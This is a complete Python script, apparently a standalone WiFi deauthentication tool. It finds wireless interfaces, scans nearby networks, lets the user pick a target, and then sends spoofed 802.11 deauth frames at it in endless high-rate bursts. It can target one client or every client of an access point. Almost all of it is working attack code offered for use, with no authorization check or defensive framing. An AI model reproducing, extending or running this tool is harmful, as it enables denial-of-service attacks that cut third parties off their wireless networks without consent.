#!/usr/bin/env python3
"""
Deauthentication Tool - WiFi Network Disconnection Utility
Similar to aircrack-ng deauth functionality
"""

import scapy.all as scapy
import argparse
import time
import sys
import subprocess
import re
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt
from scapy.layers.dot11 import Dot11ProbeReq, Dot11ProbeResp, Dot11AssoReq, Dot11AssoResp
import threading
import signal

def get_wifi_interfaces():
    """Get list of available WiFi interfaces including monitor mode"""
    interfaces = []
    
    # Method 1: Try to find monitor mode interfaces (wlan0mon, wlan1mon, etc.)
    try:
        result = subprocess.run(['ls', '/sys/class/net/'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if line.strip() and ('wlan' in line or 'wifi' in line):
                    interfaces.append(line.strip())
    except:
        pass
    
    # Method 2: Use ifconfig to find network interfaces (macOS/Linux)
    try:
        result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if ':' in line and not line.startswith('\t') and not line.startswith(' '):
                    interface_name = line.split(':')[0].strip()
                    if interface_name and ('wlan' in interface_name or 'wifi' in interface_name or 'en0' in interface_name):
                        if interface_name not in interfaces:
                            interfaces.append(interface_name)
    except:
        pass
    
    # Method 3: Use ip link (Linux)
    try:
        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'wlan' in line or 'wifi' in line:
                    match = re.search(r'\d+:\s+(\w+):', line)
                    if match:
                        interface_name = match.group(1)
                        if interface_name not in interfaces:
                            interfaces.append(interface_name)
    except:
        pass
    
    # Method 4: Use networksetup (macOS)
    try:
        result = subprocess.run(['networksetup', '-listallhardwareports'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'Wi-Fi' in line:
                    # Get the next line which contains the device name
                    lines = result.stdout.split('\n')
                    for i, l in enumerate(lines):
                        if 'Wi-Fi' in l and i + 1 < len(lines):
                            device_line = lines[i + 1]
                            if 'Device:' in device_line:
                                interface_name = device_line.split('Device:')[1].strip()
                                if interface_name not in interfaces:
                                    interfaces.append(interface_name)
    except:
        pass
    
    # Method 5: Common WiFi interface names
    common_interfaces = ['wlan0', 'wlan1', 'wlan2', 'wifi0', 'wifi1', 'en0', 'en1']
    for iface in common_interfaces:
        try:
            if scapy.conf.ifaces.get(iface):
                if iface not in interfaces:
                    interfaces.append(iface)
        except:
            pass
    
    # Method 6: Look for monitor mode interfaces
    monitor_interfaces = ['wlan0mon', 'wlan1mon', 'wlan2mon', 'wifi0mon', 'wifi1mon']
    for iface in monitor_interfaces:
        try:
            if scapy.conf.ifaces.get(iface):
                if iface not in interfaces:
                    interfaces.append(iface)
        except:
            pass
    
    # Remove duplicates and sort
    interfaces = list(set(interfaces))
    interfaces.sort()
    
    return interfaces

def check_interface_mode(interface):
    """Check if interface is in monitor mode"""
    # Check if it's a monitor mode interface by name
    if 'mon' in interface:
        return True, "Monitor Mode"
    
    # Try to check with iwconfig (Linux)
    try:
        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            if 'Mode:Monitor' in result.stdout:
                return True, "Monitor Mode"
            elif 'Mode:Managed' in result.stdout:
                return False, "Managed Mode"
            else:
                return False, "Unknown Mode"
    except:
        pass
    
    # Check with ifconfig (macOS/Linux)
    try:
        result = subprocess.run(['ifconfig', interface], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            if 'monitor' in result.stdout.lower():
                return True, "Monitor Mode"
            elif 'managed' in result.stdout.lower():
                return False, "Managed Mode"
            else:
                return False, "Managed Mode (Default)"
    except:
        pass
    
    # Default assumption
    if 'mon' in interface:
        return True, "Monitor Mode"
    else:
        return False, "Managed Mode (Default)"

def select_wifi_interface():
    """Ask user to select WiFi interface"""
    print("=" * 60)
    print("           WiFi Interface Selection")
    print("=" * 60)
    
    interfaces = get_wifi_interfaces()
    
    if not interfaces:
        print("[-] No WiFi interfaces found!")
        print("[-] Please ensure you have a WiFi card connected and drivers installed.")
        print("[-] Common interface names: wlan0, wlan1, wlan0mon (monitor mode)")
        print("[-] On macOS: en0, en1 (WiFi interfaces)")
        sys.exit(1)
    
    print(f"[+] Found {len(interfaces)} WiFi interface(s):")
    print("-" * 60)
    
    for i, interface in enumerate(interfaces, 1):
        try:
            # Try to get MAC address
            mac = scapy.get_if_hwaddr(interface)
            # Check interface mode
            is_monitor, mode = check_interface_mode(interface)
            mode_status = "✓ MONITOR" if is_monitor else "⚠ MANAGED"
            
            # Get additional interface info
            try:
                result = subprocess.run(['ifconfig', interface], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    if 'UP' in result.stdout:
                        status = "UP"
                    else:
                        status = "DOWN"
                else:
                    status = "UNKNOWN"
            except:
                status = "UNKNOWN"
            
            print(f"{i:2d}. {interface:12} - MAC: {mac:17} - {mode_status:12} - Status: {status}")
        except Exception as e:
            print(f"{i:2d}. {interface:12} - MAC: Unknown        - Mode: Unknown     - Status: UNKNOWN")
    
    print("-" * 60)
    print("[!] Monitor mode interfaces (✓) are recommended for deauth attacks")
    print("[!] Managed mode interfaces (⚠) may not work properly")
    print("[!] Status UP means interface is active and ready to use")
    print("-" * 60)
    
    while True:
        try:
            choice = input(f"[?] Select interface (1-{len(interfaces)}): ").strip()
            choice_num = int(choice)
            
            if 1 <= choice_num <= len(interfaces):
                selected_interface = interfaces[choice_num - 1]
                is_monitor, mode = check_interface_mode(selected_interface)
                
                print(f"\n[+] Selected interface: {selected_interface}")
                print(f"[+] Mode: {mode}")
                
                if not is_monitor:
                    print(f"\n[!] Warning: {selected_interface} is in {mode}")
                    print("[!] For deauth attacks, monitor mode is highly recommended")
                    if 'wlan' in selected_interface:
                        print("[!] To put in monitor mode (Linux):")
                        print(f"[!]   sudo iw dev {selected_interface} set type monitor")
                        print(f"[!]   sudo ip link set {selected_interface} up")
                    else:
                        print("[!] On macOS, monitor mode support is limited")
                        print("[!] Consider using external WiFi adapters with monitor mode support")
                
                return selected_interface
            else:
                print(f"[-] Please enter a number between 1 and {len(interfaces)}")
        except ValueError:
            print("[-] Please enter a valid number")
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            sys.exit(0)

class DeauthTool:
    def __init__(self, interface="wlan0mon"):
        self.interface = interface
        self.running = False
        self.targets = []
        self.broadcast_mac = "ff:ff:ff:ff:ff:ff"
        self.my_mac = None
        self.packet_rate = 100  # Paket hızı (paket/saniye)
        self.max_power = True   # Maksimum güç modu
        
    def get_network_info(self):
        """Get current network information"""
        try:
            # Get interface MAC address
            iface_mac = scapy.get_if_hwaddr(self.interface)
            self.my_mac = iface_mac
            print(f"[+] Interface: {self.interface}")
            print(f"[+] MAC Address: {iface_mac}")
            print(f"[+] Packet Rate: {self.packet_rate} packets/sec")
            print(f"[+] Max Power Mode: {'Enabled' if self.max_power else 'Disabled'}")
            return iface_mac
        except Exception as e:
            print(f"[-] Error getting interface info: {e}")
            return None
    
    def scan_network(self, duration=10):
        """Scan for connected devices on the network"""
        print(f"[+] Scanning network for {duration} seconds...")
        print("[+] Looking for WiFi networks in range...")
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                    bssid = pkt[Dot11].addr2
                    ssid = ""
                    
                    # Extract SSID from beacon frame
                    if pkt.haslayer(Dot11Elt):
                        for elt in pkt[Dot11Elt]:
                            if elt.ID == 0:  # SSID element
                                try:
                                    ssid = elt.info.decode('utf-8', errors='ignore')
                                    if not ssid:  # Empty SSID
                                        ssid = "<Hidden Network>"
                                except:
                                    ssid = "<Hidden Network>"
                                break
                    
                    # Extract channel information
                    channel = 1
                    if pkt.haslayer(Dot11Elt):
                        for elt in pkt[Dot11Elt]:
                            if elt.ID == 3:  # DS Parameter Set (Channel)
                                try:
                                    channel = int(elt.info[0])
                                except:
                                    channel = 1
                                break
                    
                    # Check if this network is already in our list
                    if bssid not in [t['bssid'] for t in self.targets]:
                        self.targets.append({
                            'bssid': bssid,
                            'ssid': ssid,
                            'channel': channel
                        })
                        print(f"[+] Found: {ssid:20} | {bssid:17} | Channel: {channel}")
                
                elif pkt.type == 1:  # Management frame
                    if pkt.subtype == 11:  # Deauth frame
                        src = pkt[Dot11].addr2
                        dst = pkt[Dot11].addr1
                        if src not in [t['bssid'] for t in self.targets]:
                            self.targets.append({
                                'bssid': src,
                                'ssid': 'Unknown',
                                'channel': 1
                            })
        
        try:
            print("[+] Starting packet capture...")
            scapy.sniff(iface=self.interface, prn=packet_handler, timeout=duration)
            print(f"[+] Scan completed. Found {len(self.targets)} network(s)")
        except Exception as e:
            print(f"[-] Error during scan: {e}")
            print("[!] Make sure your interface is in monitor mode")
            print("[!] Try: sudo iw dev <interface> set type monitor")
    
    def deauth_attack(self, target_bssid, client_mac=None, count=0):
        """Perform deauthentication attack with maximum power"""
        if client_mac:
            # Deauth specific client
            print(f"[+] Deauthenticating {client_mac} from {target_bssid}")
            print(f"[+] Attack Mode: Targeted Client")
            packets = []
            
            # Multiple deauth packet variations for maximum effectiveness
            # Deauth from AP to client
            deauth_pkt1 = scapy.RadioTap() / Dot11(
                addr1=client_mac, addr2=target_bssid, addr3=target_bssid
            ) / Dot11Deauth()
            
            # Deauth from client to AP
            deauth_pkt2 = scapy.RadioTap() / Dot11(
                addr1=target_bssid, addr2=client_mac, addr3=target_bssid
            ) / Dot11Deauth()
            
            # Deauth from my MAC to client (spoofed)
            deauth_pkt3 = scapy.RadioTap() / Dot11(
                addr1=client_mac, addr2=self.my_mac, addr3=target_bssid
            ) / Dot11Deauth()
            
            # Deauth from my MAC to AP (spoofed)
            deauth_pkt4 = scapy.RadioTap() / Dot11(
                addr1=target_bssid, addr2=self.my_mac, addr3=target_bssid
            ) / Dot11Deauth()
            
            packets.extend([deauth_pkt1, deauth_pkt2, deauth_pkt3, deauth_pkt4])
        else:
            # Broadcast deauth with maximum power
            print(f"[+] Broadcasting deauth to ALL clients on {target_bssid}")
            print(f"[+] Attack Mode: Maximum Power Broadcast")
            packets = []
            
            # Multiple broadcast deauth variations
            # Standard broadcast
            deauth_pkt1 = scapy.RadioTap() / Dot11(
                addr1=self.broadcast_mac, addr2=target_bssid, addr3=target_bssid
            ) / Dot11Deauth()
            
            # Spoofed from my MAC
            deauth_pkt2 = scapy.RadioTap() / Dot11(
                addr1=self.broadcast_mac, addr2=self.my_mac, addr3=target_bssid
            ) / Dot11Deauth()
            
            # Direct to broadcast from AP
            deauth_pkt3 = scapy.RadioTap() / Dot11(
                addr1=self.broadcast_mac, addr2=target_bssid, addr3=target_bssid
            ) / Dot11Deauth()
            
            packets.extend([deauth_pkt1, deauth_pkt2, deauth_pkt3])
        
        sent_count = 0
        start_time = time.time()
        
        print(f"[+] Starting MAXIMUM POWER attack...")
        print(f"[+] Target BSSID: {target_bssid}")
        print(f"[+] Packet Rate: {self.packet_rate} packets/sec")
        print(f"[+] Press Ctrl+C to stop")
        
        while self.running:
            try:
                # Send multiple packets rapidly
                for _ in range(self.packet_rate // 10):  # Send in bursts
                    for pkt in packets:
                        scapy.send(pkt, iface=self.interface, verbose=False)
                        sent_count += 1
                        if count > 0 and sent_count >= count:
                            print(f"[+] Sent {sent_count} packets in {time.time() - start_time:.2f} seconds")
                            return
                
                # Show progress every 5 seconds
                if sent_count % (self.packet_rate * 5) == 0 and sent_count > 0:
                    elapsed = time.time() - start_time
                    rate = sent_count / elapsed if elapsed > 0 else 0
                    print(f"[+] Sent {sent_count} packets | Rate: {rate:.1f} pkt/sec | Elapsed: {elapsed:.1f}s")
                
                time.sleep(0.01)  # Minimal delay for maximum speed
                
            except KeyboardInterrupt:
                print(f"\n[!] Attack stopped! Sent {sent_count} packets in {time.time() - start_time:.2f} seconds")
                break
            except Exception as e:
                print(f"[-] Error sending deauth packet: {e}")
                break
    
    def start_deauth(self, target_bssid=None, client_mac=None, count=0):
        """Start deauthentication attack"""
        if not target_bssid and self.targets:
            target_bssid = self.targets[0]['bssid']
            print(f"[+] Using first found target: {target_bssid}")
        
        if not target_bssid:
            print("[-] No target BSSID specified")
            return
        
        self.running = True
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\n[!] Shutting down...")
            self.running = False
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        
        try:
            self.deauth_attack(target_bssid, client_mac, count)
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user")
        finally:
            self.running = False
    
    def list_targets(self):
        """List all discovered targets"""
        if not self.targets:
            print("[-] No targets found. Run scan first.")
            return
        
        print("\n[+] Discovered Targets:")
        print("-" * 50)
        for i, target in enumerate(self.targets, 1):
            print(f"{i}. SSID: {target['ssid']}")
            print(f"   BSSID: {target['bssid']}")
            print(f"   Channel: {target['channel']}")
            print()

def main():
    parser = argparse.ArgumentParser(description="WiFi Deauthentication Tool - Maximum Power")
    parser.add_argument("-i", "--interface", help="Wireless interface (will prompt if not specified)")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan for networks")
    parser.add_argument("-t", "--target", help="Target BSSID")
    parser.add_argument("--bssid", help="Target BSSID (alternative to -t)")
    parser.add_argument("-c", "--client", help="Specific client MAC to deauth")
    parser.add_argument("-n", "--count", type=int, default=0, help="Number of deauth packets (0 for infinite)")
    parser.add_argument("-d", "--duration", type=int, default=10, help="Scan duration in seconds")
    parser.add_argument("-r", "--rate", type=int, default=100, help="Packet rate per second (default: 100)")
    parser.add_argument("--max-power", action="store_true", help="Enable maximum power mode")
    parser.add_argument("--no-prompt", action="store_true", help="Skip WiFi interface selection prompt")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("           WiFi Deauthentication Tool")
    print("=" * 60)
    
    # WiFi interface selection
    if args.interface:
        selected_interface = args.interface
        print(f"[+] Using specified interface: {selected_interface}")
    elif not args.no_prompt:
        selected_interface = select_wifi_interface()
    else:
        selected_interface = "wlan0mon"  # Default fallback
        print(f"[+] Using default interface: {selected_interface}")
    
    # Check if interface is in monitor mode
    is_monitor, mode = check_interface_mode(selected_interface)
    if not is_monitor:
        print(f"\n[!] Interface {selected_interface} is in {mode}")
        print("[!] For best results, put it in monitor mode:")
        print(f"[!] sudo iw dev {selected_interface} set type monitor")
        print(f"[!] sudo ip link set {selected_interface} up")
        print("[!] Continue anyway? (y/N): ", end="")
        
        try:
            response = input().strip().lower()
            if response not in ['y', 'yes']:
                print("[!] Exiting...")
                sys.exit(0)
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            sys.exit(0)
    
    tool = DeauthTool(selected_interface)
    
    # Set packet rate and max power mode
    if args.rate:
        tool.packet_rate = args.rate
    if args.max_power:
        tool.max_power = True
        tool.packet_rate = 200  # Increase rate for max power mode
    
    # Get interface info
    iface_mac = tool.get_network_info()
    if not iface_mac:
        print("[-] Failed to get interface information")
        sys.exit(1)
    
    # Automatic WiFi network scanning after interface selection
    if not args.no_prompt:
        print(f"\n[+] Scanning for WiFi networks in range...")
        print("[+] This may take a few seconds...")
        
        # Scan for networks
        tool.scan_network(args.duration)
        
        if tool.targets:
            print(f"\n[+] Found {len(tool.targets)} WiFi network(s):")
            print("-" * 60)
            
            for i, target in enumerate(tool.targets, 1):
                print(f"{i:2d}. SSID: {target['ssid']:20} | BSSID: {target['bssid']:17} | Channel: {target['channel']}")
            
            print("-" * 60)
            
            # Ask user which network to attack
            while True:
                try:
                    choice = input(f"[?] Select target network (1-{len(tool.targets)}): ").strip()
                    choice_num = int(choice)
                    
                    if 1 <= choice_num <= len(tool.targets):
                        selected_target = tool.targets[choice_num - 1]
                        target_bssid = selected_target['bssid']
                        print(f"\n[+] Selected target: {selected_target['ssid']} ({target_bssid})")
                        break
                    else:
                        print(f"[-] Please enter a number between 1 and {len(tool.targets)}")
                except ValueError:
                    print("[-] Please enter a valid number")
                except KeyboardInterrupt:
                    print("\n[!] Exiting...")
                    sys.exit(0)
        else:
            print("[-] No WiFi networks found in range")
            print("[-] Check if your WiFi card is working properly")
            sys.exit(1)
    else:
        # Manual target specification (when --no-prompt is used)
        target_bssid = args.target or args.bssid
        if tool.targets and not target_bssid:
            target_bssid = tool.targets[0]['bssid']
    
    # Scan for networks if requested manually
    if args.scan and not tool.targets:
        tool.scan_network(args.duration)
        tool.list_targets()
    
    # Determine final target BSSID
    if not args.no_prompt:
        # Target already selected above
        pass
    else:
        target_bssid = args.target or args.bssid
        if tool.targets and not target_bssid:
            target_bssid = tool.targets[0]['bssid']
    
    # Start deauth attack
    if target_bssid or tool.targets:
        print(f"\n[+] Starting MAXIMUM POWER deauth attack...")
        print(f"[+] Interface: {selected_interface}")
        print(f"[+] Target BSSID: {target_bssid or tool.targets[0]['bssid'] if tool.targets else 'None'}")
        print(f"[+] Client: {args.client or 'ALL CLIENTS'}")
        print(f"[+] Count: {args.count or 'INFINITE'}")
        print(f"[+] Packet Rate: {tool.packet_rate} packets/sec")
        print(f"[+] Max Power Mode: {'ENABLED' if tool.max_power else 'Disabled'}")
        print("\n[!] Press Ctrl+C to stop")
        
        tool.start_deauth(target_bssid, args.client, args.count)
    else:
        print("[-] No target specified. Use -s to scan or --bssid/-t to specify target.")
        print("[-] Example: sudo python3 deauth.py --bssid 00:11:22:33:44:55 --max-power")
        print("[-] Example: sudo python3 deauth.py -s -t 00:11:22:33:44:55 -r 200")
        print("[-] Example: sudo python3 deauth.py --no-prompt -s (skip interface selection)")

if __name__ == "__main__":
    main()
